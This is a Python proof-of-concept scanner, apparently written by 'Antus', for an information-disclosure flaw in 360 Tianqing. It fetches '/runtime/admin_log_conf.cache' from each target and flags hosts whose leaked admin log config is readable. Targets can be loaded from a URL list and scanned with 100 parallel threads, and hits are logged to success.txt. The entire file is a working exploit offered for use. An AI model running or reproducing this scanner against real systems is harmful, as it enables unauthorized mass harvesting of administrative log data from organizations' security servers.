import requests,re,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """
        ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗    ██╗     ███████╗ █████╗ ██╗  ██╗ █████╗  ██████╗ ███████╗
        ╚════██╗██╔════╝ ██╔═████╗      ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║    ██║     ██╔════╝██╔══██╗██║ ██╔╝██╔══██╗██╔════╝ ██╔════╝
        █████╔╝███████╗ ██║██╔██║█████╗██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║    ██║     █████╗  ███████║█████╔╝ ███████║██║  ███╗█████╗  
╚   ═══██╗██╔═══██╗████╔╝██║╚════╝██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║    ██║     ██╔══╝  ██╔══██║██╔═██╗ ██╔══██║██║   ██║██╔══╝  
        ██████╔╝╚██████╔╝╚██████╔╝      ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║    ███████╗███████╗██║  ██║██║  ██╗██║  ██║╚██████╔╝███████╗
        ╚═════╝  ╚═════╝  ╚═════╝       ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝    ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
                                                                                                                                    BY:Antus                                               
    """
    print(test)
def poc(target):
    headers = {
        'User-Agent': 'Mozilla/5.0 (windows NT 10.0; Win64; x64;rv:128.0) Gecko/20100101 Firefox/128.0'
    }
    payload = '/runtime/admin_log_conf.cache'
    try:
        res1 = requests.get(url = target+payload,headers=headers,verify=False,timeout=10)
        content = re.findall(r's:12:"(.*?)";',res1.text)
        if '/login/login' in content:
            print(f"[+]{target}存在信息泄露")
            with open('success.txt','a',encoding='utf-8') as f:
                f.write(f"[+]{target}存在漏洞\n")
        elif res1.status_code != 200:
            print(f"[+]{target}网站未响应，请手工测试")
        else:
            print(f"[-]{target}不存在漏洞")
    except Exception as e:
        print(e)

def main():
    banner()
    parse = argparse.ArgumentParser(description='360天擎存在信息泄露')
    parse.add_argument('-u','--url',dest='url',type=str,help='please enter url')
    parse.add_argument('-f','--file',dest='file',type=str,help='please enter file')
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print("你输入的有误请输入'python 360.py -h'查看帮助信息")



if __name__ == '__main__':
    main()